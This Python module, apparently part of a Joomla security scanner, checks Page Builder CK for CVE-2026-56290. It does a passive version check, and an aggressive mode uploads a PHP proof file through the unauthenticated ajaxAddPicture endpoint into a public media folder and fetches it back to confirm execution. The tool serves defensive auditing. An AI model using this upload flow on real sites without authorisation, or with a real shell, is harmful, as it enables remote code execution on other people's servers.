from __future__ import annotations

import re
import urllib.parse
from urllib.parse import urljoin

from ...core.evidence import generate_php_math_payload, verify_php_execution
from ...core.http import build_multipart, normalize_url, request
from ...core.models import Finding

CVECheckResult = Finding
from ...core.probes import rand_str

CVE_ID = "CVE-2026-56290"
NAME = "Page Builder CK arbitrary file upload to RCE"
COMPONENT = "Page Builder CK"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["aggressive"]
AFFECTED_JOOMLA_VERSIONS = ["*"]
AFFECTED_RULE = "Page Builder CK up to and including 3.5.10 (fixed 3.6.0; J3 line fixed 3.1.1; J4 line fixed 3.4.10)"
FIXED_RULE = "Page Builder CK 3.6.0 or later (3.1.1+ on Joomla 3, 3.4.10+ on Joomla 4)"
TASK_CANDIDATES = [
    "browse.ajaxAddPicture",
]
FILE_PARAM_NAMES = ["file"]
FOLDER_PARAM_NAMES = ["path"]
DEST_PATHS = [
    "media/com_pagebuilderck/gfonts/",
]
SHELL_EXTENSIONS = ["php", "PHP", "pht", "phar"]


def extract_csrf(target_url: str, timeout: int = 12, proxy: str | None = None):
    pages = ["", "/index.php?option=com_users&view=login", "/administrator/index.php"]
    base = normalize_url(target_url)
    for page in pages:
        response = request(f"{base}{page}", timeout=timeout, proxy=proxy)
        body = response.get("body", "")
        match = re.search(
            r'<input[^>]+type=["\']hidden["\'][^>]+name=["\']([a-f0-9]{32})["\'][^>]+value=["\']1["\']',
            body,
            re.IGNORECASE,
        )
        if match:
            return match.group(1), "1"
        match = re.search(r'["\']csrf\.token["\']\s*:\s*["\']([a-f0-9]{32})["\']', body, re.IGNORECASE)
        if match:
            return match.group(1), "1"
    return None


def affected_pagebuilderck(version: str | None) -> bool | None:
    """True if in the affected current line, False if fixed, None if ambiguous."""
    from ...core.versions import parse_version_safe, version_lte

    parsed = parse_version_safe(version)
    if parsed is None:
        return None
    release = parsed.release
    if release[0] == 3 and len(release) > 1 and release[1] in (1, 4):
        # Legacy Joomla 3 / Joomla 4 lines carry their own back-ports
        # (fixed 3.1.1 / 3.4.10); the current-line range does not apply.
        return None
    if version_lte(version, "3.5.10"):
        return True
    if not version_lte(version, "3.6.0"):
        return False
    return None


def passive_result(plugins: dict | None) -> Finding:
    pbck = (plugins or {}).get("pagebuilderck", {})
    found = bool(pbck.get("found"))
    version = pbck.get("version")
    source = pbck.get("source") or "unknown"
    if not found:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_DETECTED",
            confidence="MEDIUM",
            component=COMPONENT,
            component_version=None,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            detail="Page Builder CK was not detected via components/component/media routes.",
            action="Component not detected via standard public routes; verify manually if installed elsewhere.",
        )
    verdict = affected_pagebuilderck(version)
    if verdict is True:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="LIKELY_VULNERABLE",
            confidence="HIGH",
            component=COMPONENT,
            component_version=version,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            detail=f"Page Builder CK {version} is at or below 3.5.10.",
            action=f"Upgrade Page Builder CK to {FIXED_RULE} and inspect media/com_pagebuilderck/ for stray PHP files.",
        )
    if verdict is False:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="PATCHED",
            confidence="HIGH",
            component=COMPONENT,
            component_version=version,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            detail=f"Page Builder CK {version} is at or above the fixed 3.6.0.",
            action="No action required if the installed package is vendor-original.",
        )
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="INCONCLUSIVE",
        confidence="MEDIUM",
        component=COMPONENT,
        component_version=version,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        detail=(
            f"Page Builder CK was detected (version: {version or 'unknown'}, source: {source}), but the affected version range "
            "is unconfirmed/ambiguous in public advisories. Static rule matching is kept inconclusive."
        ),
        action="Manually verify Page Builder CK version against vendor advisory or run lab exploit verification if authorized.",
    )


def try_upload(base: str, task: str, file_param: str, folder_param: str, dest_path: str, csrf_name: str, timeout: int, proxy: str | None, filename: str, payload: str):
    content_type, body = build_multipart(
        {folder_param: dest_path},
        {file_param: (filename, payload, "application/x-php")},
    )
    upload_url = (
        f"{base}/index.php?option=com_pagebuilderck"
        f"&task={urllib.parse.quote(task)}"
        f"&type=files"
        f"&{csrf_name}=1"
    )
    upload = request(
        upload_url,
        method="POST",
        headers={"Content-Type": content_type},
        data=body,
        timeout=timeout,
        proxy=proxy,
    )
    proof_url = urljoin(base + "/", f"/{dest_path}{filename}")
    proof = request(proof_url, timeout=timeout, proxy=proxy)
    return upload, proof, proof_url


def run_aggressive_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    csrf = extract_csrf(base, timeout=timeout, proxy=proxy)
    if not csrf:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_CONFIRMED",
            confidence="LOW",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            detail="Could not harvest a Joomla CSRF token, so upload endpoint discovery was skipped.",
            action="Verify manually in a lab and update Page Builder CK.",
        )
    csrf_name = csrf[0]
    payload, expected_product = generate_php_math_payload()
    observed = []
    for ext in SHELL_EXTENSIONS:
        filename = f"jvh-pbck-{rand_str(8)}.{ext}"
        upload, proof, proof_url = try_upload(
            base,
            "browse.ajaxAddPicture",
            "file",
            "path",
            "media/com_pagebuilderck/gfonts/",
            csrf_name,
            timeout,
            proxy,
            filename,
            payload,
        )
        upload_body = upload.get("body", "")
        proof_body = proof.get("body", "")
        upload_flags = []
        if "CK_FILE_NOT_AUTHORIZED" in upload_body or "not authorized" in upload_body.lower():
            upload_flags.append("extension-filtered")
        if "JINVALID_TOKEN" in upload_body:
            upload_flags.append("token-rejected")
        observed.append(
            f".{ext}: upload {upload.get('status')}, proof {proof.get('status')}"
            + (f" ({', '.join(upload_flags)})" if upload_flags else "")
        )
        if proof.get("status") == 200:
            is_exec, is_source = verify_php_execution(proof_body, expected_product)
            if is_exec:
                return Finding(
                    cve=CVE_ID,
                    name=NAME,
                    status="VULNERABLE",
                    confidence="CONFIRMED",
                    component=COMPONENT,
                    affected_rule=AFFECTED_RULE,
                    exploit_available=HAS_EXPLOIT,
                    exploit_ran=True,
                    proof_url=proof_url,
                    uploaded_filename=f"media/com_pagebuilderck/gfonts/{filename}",
                    detail=(
                        "Targeted lab probe used Page Builder CK's real upload flow "
                        "(task=browse.ajaxAddPicture, file field=file, path field=path) "
                        f"and executed dynamic PHP math proof ({expected_product})."
                    ),
                    action=f"Delete media/com_pagebuilderck/gfonts/{filename}, inspect for compromise, and update Page Builder CK.",
                )
            if is_source or "<?php" in proof_body.lower():
                return Finding(
                    cve=CVE_ID,
                    name=NAME,
                    status="VULNERABLE_UPLOAD_ONLY",
                    confidence="HIGH",
                    component=COMPONENT,
                    affected_rule=AFFECTED_RULE,
                    exploit_available=HAS_EXPLOIT,
                    exploit_ran=True,
                    proof_url=proof_url,
                    uploaded_filename=f"media/com_pagebuilderck/gfonts/{filename}",
                    detail=(
                        "Targeted lab probe confirmed a file write through the real Page Builder CK "
                        "upload flow, but PHP execution was not confirmed because the server returned source."
                    ),
                    action=f"Delete media/com_pagebuilderck/gfonts/{filename} and update Page Builder CK.",
                )
    # Fallback: benign marker upload. Modern Joomla stacks gate unsafe files
    # in the framework input layer (isSafeFile), so a literal .php may never
    # reach the component; a benign marker still proves the missing
    # auth/permission gate when stored publicly.
    marker = f"PROOFCMS_PBCK_{rand_str(12)}"
    txt_name = f"jvh-pbck-{rand_str(8)}.txt"
    txt_content = f"ProofCMS authorized audit marker {marker}\n"
    txt_type, txt_body = build_multipart(
        {"path": "media/com_pagebuilderck/gfonts/"},
        {"file": (txt_name, txt_content, "text/plain")},
    )
    txt_upload_url = (
        f"{base}/index.php?option=com_pagebuilderck"
        f"&task=browse.ajaxAddPicture"
        f"&{csrf_name}=1"
    )
    txt_upload = request(
        txt_upload_url,
        method="POST",
        headers={"Content-Type": txt_type},
        data=txt_body,
        timeout=timeout,
        proxy=proxy,
    )
    txt_upload_status = txt_upload.get("status", 0)
    txt_proof_url = urljoin(base + "/", f"/media/com_pagebuilderck/gfonts/{txt_name}")
    txt_proof = request(txt_proof_url, timeout=timeout, proxy=proxy)
    if txt_proof.get("status") == 200 and marker in (txt_proof.get("body", "") or ""):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE_UPLOAD_ONLY",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            proof_url=txt_proof_url,
            uploaded_filename=f"media/com_pagebuilderck/gfonts/{txt_name}",
            detail=(
                "Unauthenticated marker upload was accepted and read back byte-identical from the public "
                "gfonts directory, confirming the missing auth/permission gate. A literal .php does not "
                "reach the component on this stack (framework isSafeFile input gate); execution is "
                "server-dependent and no executable content was uploaded."
            ),
            action=f"Delete media/com_pagebuilderck/gfonts/{txt_name} and update Page Builder CK.",
        )
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="NOT_CONFIRMED",
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        exploit_ran=True,
        detail=(
            "Targeted lab probe used the installed Page Builder CK flow "
            "(task=browse.ajaxAddPicture, file field=file, path field=path), but did not confirm "
            "PHP write/execution. Observed: "
            + ("; ".join(observed[:8]) if observed else "none")
            + f"; marker upload {txt_upload_status}, proof {txt_proof.get('status')}."
        ),
        action="If any lab probe wrote a file, remove it and update Page Builder CK.",
    )


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    plugins: dict | None = None,
    **kwargs,
) -> Finding:
    result = passive_result(plugins)
    if not run_exploit_check:
        return result
    if exploit_mode != "aggressive":
        result.detail += " This CVE requires aggressive lab-only upload verification."
        return result
    if result.status not in {"LIKELY_VULNERABLE", "INCONCLUSIVE"}:
        return result
    probe = run_aggressive_probe(target_url, timeout=timeout, proxy=proxy)
    probe.component_version = result.component_version
    return probe


def affects_joomla_version(joomla_version: str | None) -> bool:
    return True


def metadata() -> dict:
    return {
        "cve": CVE_ID,
        "name": NAME,
        "component": COMPONENT,
        "affected_rule": AFFECTED_RULE,
        "affected_joomla_versions": AFFECTED_JOOMLA_VERSIONS,
        "exploit_available": HAS_EXPLOIT,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": INTRUSIVE,
        "module_version": "1.3.0",
        "last_reviewed": "2026-11-11",
        "updated": "2026-11-11",
        "required_detectors": ["pagebuilderck"],
        "references": [
            "https://www.joomlack.fr/en/joomla-extensions/page-builder-ck",
            "https://www.cve.org/CVERecord?id=CVE-2026-56290",
            "https://www.exploit-db.com/exploits/52626",
            "https://mysites.guru/blog/pagebuilderck-unauthenticated-file-upload-rce/",
        ],
    }
